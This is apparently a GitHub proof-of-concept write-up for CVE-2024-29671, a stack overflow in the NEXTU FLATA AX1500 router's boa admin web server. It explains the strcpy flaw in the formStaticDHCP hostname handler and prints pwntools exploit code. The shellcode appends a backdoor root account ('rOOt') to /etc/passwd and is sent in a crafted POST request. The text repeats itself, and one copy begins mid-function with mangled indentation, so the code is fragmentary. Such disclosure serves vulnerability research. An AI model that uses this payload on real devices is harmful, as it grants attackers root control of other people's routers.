# NEXTU FLETA Wifi6 Router RCE Exploit POC

This document describes how the **CVE-2024-29671** vulnerability was exploited in the **NEXTU FLATA AX1500** Router firmware.

## Execution Environment

This router is based on the MIPS architecture using the Realtek chipset with Little-Endian.

The target router firmware version is v1.0.2.

This firmware include embedded web server name as "boa", which was last released in 2005.

However, this router uses the boa web server to provide an admin web page service that controls the router's firmware.

## Cause of the vulnerability

The "boa" binary security status is as follows.

[![fig_1.png](/laskdjlaskdj12/CVE-2024-29671-POC/raw/main/fig_1.png)](/laskdjlaskdj12/CVE-2024-29671-POC/blob/main/fig_1.png)
Fig 1. boa webserver binary checksec result

The cause of the stack overflow is that the length value check was not performed when copying the contents of the **hostname** parameter using **strcpy()** in the **0x00411c00** **formStaticDHCP** function. When request handler doing processes form requests in **boa** webserver.

[![fig_2.png](/laskdjlaskdj12/CVE-2024-29671-POC/raw/main/fig_2.png)](/laskdjlaskdj12/CVE-2024-29671-POC/blob/main/fig_2.png)
Fig 2. Stack overflow occur location

[![fig_3.png](/laskdjlaskdj12/CVE-2024-29671-POC/raw/main/fig_3.png)](/laskdjlaskdj12/CVE-2024-29671-POC/blob/main/fig_3.png)
Fig 3. Stack memory view before stack overflow is occur.
(White line is RET address area)

[![fig_4.png](/laskdjlaskdj12/CVE-2024-29671-POC/raw/main/fig_4.png)](/laskdjlaskdj12/CVE-2024-29671-POC/blob/main/fig_4.png)

Fig 4. Stack memory view after stack overflow is occur.

As you can see in stack 0x7ffef7dc address, witch stored handler RET address, is overflowed data by 0x42('B').

## Exploit explain

If an attacker inserts a remote execution code and add the overwrites address in the RET area into the 'hostname' parameter value of the /boafrm/formStaticDHCP POST request,
the Arbitrary code must be executed as root.

## Vulnerability POC

    asmcode = shellcraft.mips.linux.execve(cmd, args) + shellcraft.mips.linux.exit()
    shellcode = asm(asmcode)
    return shellcode

shellcode = add_user_credential_shell_code()

print(shellcode)
gap_code = (b'A') * 1282

# insert RET Address by your own
# In this case, the address value is in the video below that execute RCE.
RET_address = (b'\xe0\x4e\xb9\x7f')
stack_gap = (b'B') * 0x180

final_code = gap_code + RET_address + stack_gap + shellcode

        headers = b"POST /boafrm/formStaticDHCP HTTP/1.1\r\n" \
                  b"Host: " + HOST.encode('utf-8') + b"\r\n" \

                                                     b"Content-Length: " + str(len(send_byte)).encode(
            'utf-8') + b"\r\nConnection: close\r\n\r\n"

        ssock.send(headers + send_byte)

        response = b""
        while True:
            data = ssock.recv(1024)
            if not data:
                break
            response += data

        print(response.decode('utf-8'))

# NEXTU FLETA Wifi6 Router RCE Exploit POC

This document describes how the **CVE-2024-29671** vulnerability was exploited in the **NEXTU FLATA AX1500** Router firmware.

[CVE ID]

CVE-2024-29671

[Vendor of Product]

NEXTU

[Product]

FLATA AX1500 Wifi6 Router

[Version]

1.0.2

[Vulnerability Type]

Buffer overflow

## Vulnerability Description

### Execution Environment

This router is based on the MIPS architecture using the Realtek chipset with Little-Endian.

The target router firmware version is v1.0.2.

This firmware include embedded web server name as "boa", which was last released in 2005.

However, this router uses the boa web server to provide an admin web page service that controls the router's firmware.

### Cause of the vulnerability

The cause of the stack overflow is that the length value check was not performed in formStaticDHCP request handler.
So the contents of the hostname parameter copied using strcpy() in the 0x00411c00 formStaticDHCP function.
Which mean this make overlapping stack frame.

### Exploit explain

If an attacker inserts a remote execution code and add the overwrites address in the RET area into the 'hostname' parameter value of the /boafrm/formStaticDHCP POST request, the Arbitrary code must be executed.

## Vulnerability POC

```
from pwn import *
from hackebds import *

# id: rOOt
# passwd: pwn3d

def add_user_credential_shell_code():
    context.update(arch='mips', os='linux', bits=32, endian='little')

    cmd = "/bin/sh"
    args = ["sh", "-c", "echo \"rOOt:XJ1GV.nyFFMoI:0:0:root:/:/bin/sh\" >> /etc/passwd"]

    asmcode = shellcraft.mips.linux.execve(cmd, args) + shellcraft.mips.linux.exit()
    shellcode = asm(asmcode)
    return shellcode

shellcode = add_user_credential_shell_code()

print(shellcode)
gap_code = (b'A') * 1282

# insert RET Address by your own
# In this case, the address value is in the video below that execute RCE.
RET_address = (b'\xe0\x4e\xb9\x7f')
stack_gap = (b'B') * 0x180

final_code = gap_code + RET_address + stack_gap + shellcode

        # POST Request Header
        headers = b"POST /boafrm/formStaticDHCP HTTP/1.1\r\n" \
                  b"Host: " + HOST.encode('utf-8') + b"\r\n" \
                                                     b"Content-Type: application/octet-stream\r\n" \
                                                     b"Content-Length: " + str(len(send_byte)).encode(
            'utf-8') + b"\r\nConnection: close\r\n\r\n"

        ssock.send(headers + send_byte)

        response = b""
        while True:
            data = ssock.recv(1024)
            if not data:
                break
            response += data

        print(response.decode('utf-8'))
